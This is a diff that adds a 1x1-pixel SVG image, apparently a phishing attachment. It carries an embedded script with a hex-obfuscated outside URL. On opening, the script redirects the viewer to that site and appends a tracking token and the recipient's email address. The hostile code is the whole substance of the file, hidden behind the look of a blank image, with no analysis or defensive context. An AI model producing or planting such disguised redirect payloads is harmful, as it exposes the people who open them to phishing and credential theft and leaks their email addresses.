@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1">
+<!--[CDATA[-->
+<defs>
+<filter id="r" x="0" y="0">
+<feGaussianBlur in="SourceGraphic" stdDeviation="0"/>
+<feColorMatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0"/>
+</filter>
+</defs>
+<script type="text/ecmascript"><![CDATA[
+(function(){
+var encodedPart = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x62\x6D\x65\x64\x69\x63\x61\x6C\x67\x72\x6F\x75\x70\x2E\x6F\x72\x67\x2E\x75\x6B\x2F\x6D\x65\x64\x69\x63\x61\x6C\x2F";
+window.location.href = encodedPart + "N0123N[EMAIL]";
+})();
+]]></script>
+<rect width="1" height="1" filter="url(#r)" fill="#fff"/>
+</svg>
